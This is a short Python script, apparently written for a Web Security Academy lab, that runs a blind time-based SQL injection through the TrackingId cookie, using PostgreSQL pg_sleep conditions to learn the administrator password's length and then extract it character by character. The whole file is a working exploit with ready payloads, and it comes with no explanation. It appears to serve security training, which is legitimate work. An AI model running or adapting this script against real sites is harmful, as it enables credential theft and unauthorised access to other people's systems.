import requests
import string

brute = string.ascii_lowercase + string.digits
url = 'https://0a5600e8038f069a81134e8800f90084.web-security-academy.net/'
header = {'User-Agent':'Mozilla/5.0'}

def get_length():
    for i in range(1,51):
        payload = f"'||(SELECT CASE WHEN ((select length(password) from users where username='administrator')={i}) THEN pg_sleep(2) ELSE pg_sleep(0) END)||'"
        cookie = {'TrackingId':'5wC5QhhEZg0Ok8BI'+payload, 'session':'FAn2OGfHsw9X3a1jAxfJXkWy9Gb9RLQL'}
        r = requests.get(url,cookies=cookie,headers=header)
        # print(r.elapsed.total_seconds())
        # print(r.elapsed)
        print(i)
        if r.elapsed.total_seconds() > 2:
            print(f"Length is {i}")
            return i

def get_passwd(n):
    password = ''
    for i in range(1,n+1):
        for char in brute:
            payload = f"'||(SELECT CASE WHEN ((select substring(password,{i},1) from users where username='administrator')='{char}') THEN pg_sleep(2) ELSE pg_sleep(0) END)||'"
            cookie = {'TrackingId':'5wC5QhhEZg0Ok8BI'+payload, 'session':'FAn2OGfHsw9X3a1jAxfJXkWy9Gb9RLQL'}
            r = requests.get(url, cookies=cookie, headers=header)
            if r.elapsed.total_seconds() > 2:
                password += char
                print(password)
                break
    print(f"Password Found: {password}")
    return password

get_passwd(get_length())
